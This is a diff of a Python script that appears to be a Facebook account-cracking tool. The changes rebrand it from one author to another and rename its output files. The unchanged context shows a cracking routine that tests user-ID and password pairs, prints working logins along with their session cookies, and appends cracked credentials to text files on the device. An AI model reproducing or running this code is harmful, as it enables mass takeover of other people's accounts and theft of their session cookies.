@@ -1,4 +1,4 @@
-#SC MAKED BY SAMIR
+#SC MAKED BY JUBAYER
 import os,sys,time,json,random,re,string,platform,base64,uuid
 from bs4 import BeautifulSoup as sop
 from bs4 import BeautifulSoup
@@ -87,7 +87,7 @@ logo = ("""
 
  
 
-\033[1;91m\033[1;41m\033[1;97m              WELCOME TO SAIKO HAKER                \033[;0m\033[1;91m\033[1;92m
+\033[1;91m\033[1;41m\033[1;97m  WELCOME TO SAIKO HAKER                \033[;0m\033[1;91m\033[1;92m
 
 \033[1;92m══════════════════════════════════════════
 \033[1;32m[-] TOOLS TYPE:\033[1;32m FREE
@@ -262,14 +262,14 @@ def rcrack1(uid,pwx,tl):
                 cid = coki[7:22]
                 print(f"\033[38;5;46m[SAIKO-OK🌻] {uid}|{ps}")
                 print(f"\n[COOKIE🎁] : {coki}")
-                open('/sdcard/SAMIR/ok.txt', 'a').write( uid+' | '+ps+'\n')
+                open('/sdcard/SAIKO/ok.txt', 'a').write( uid+' | '+ps+'\n')
                 oks.append(uid)
                 break
             elif 'checkpoint' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[82:97]
                 print(f"\x1b[38;5;196m[SAIKO-CP❌] {uid}|{ps}")
-                open('/sdcard/SAMIR-CP.txt', 'a').write( uid+' | '+ps+' \n')
+                open('/sdcard/SAIKO-CP.txt', 'a').write( uid+' | '+ps+' \n')
                 cps.append(uid)
                 break
             else:
